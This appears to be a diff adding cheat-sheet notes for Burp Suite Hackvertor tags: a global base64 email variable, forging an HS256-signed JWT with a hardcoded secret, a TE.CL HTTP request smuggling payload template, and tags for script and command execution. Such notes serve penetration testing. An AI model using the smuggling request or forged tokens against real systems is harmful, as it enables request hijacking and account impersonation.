@@ -1,0 +1,31 @@
+set a global variable:
+<@set_email(true)><@base64>jimmy.tharel@ibm.com<@/base64><@/set_email>
+	the 'true' flag defines the 'email' variable as global in burp
+
+
+Generate a signed JWT
+<@jwt('HS256','secretkey')>{"email":<@get_email/>","uid":12345}<@/jwt>
+	uses global variable from above
+
+
+HTTP Request Smuggling TE.CL
+	POST / HTTP/1.1
+	Host: vulnerable-website.com
+	Content-Length: <@arithmetic(2,'+')><@length><@chunked_dec2hex><@length><@get_chunk/><@/length><@/chunked_dec2hex><@/length><@/arithmetic>
+	Transfer-Encoding: chunked
+
+	<@chunked_dec2hex><@length><@get_chunk/><@/length><@/chunked_dec2hex>
+	<@set_chunk(false)>SMUGGLED<@/set_chunk>
+	0
+
+		#Length shown in the response is in Hex
+		#Content-Length in response is based on the number shown for the length of the string (SMUGGLED)
+		#so it would be 8\r\n to give a content length of 3
+
+	
+Script Execution:
+	<@python> (jython v2.7.0)
+	<@java>
+
+Command Execution:
+	<@system>
